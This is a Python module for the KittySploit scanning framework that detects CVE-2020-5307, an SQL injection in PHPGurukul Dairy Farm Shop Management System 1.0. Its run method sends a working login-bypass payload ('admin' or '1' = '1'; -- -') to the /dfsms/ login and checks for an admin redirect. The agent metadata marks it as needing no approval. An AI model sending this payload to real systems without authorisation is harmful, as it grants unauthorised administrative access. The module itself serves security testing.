#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHPGurukul Dairy Farm Shop Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPGurukul Dairy Farm Shop Management System 1.0 - SQL Injection Detection',
        'description': 'PHPGurukul Dairy Farm Shop Management System 1.0 is vulnerable to SQL injection, as demonstrated by the username parameter in index.php, the category and CategoryCode parameters in add-category.php, the CompanyName parameter in add-company.php, and the ProductName and ProductPrice parameters in add-product.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'sqli', 'edb', 'phpgurukul', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://cinzinga.com/CVE-2020-5307-5308/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-5307',
            'https://www.exploit-db.com/exploits/47846',
            'https://cinzinga.github.io/CVE-2020-5307-5308/',
        ],
        'cve': 'CVE-2020-5307',
    }

    def run(self):
        path = '/dfsms/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n')
        if not r or r.status_code != 302:
            return False
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('add-category.php',)
        if any(m in headers for m in header_any):
            self.set_info(severity='critical', reason='PHPGurukul Dairy Farm Shop Management System 1.0 - SQL Injection detected', path=path)
            return True
        return False

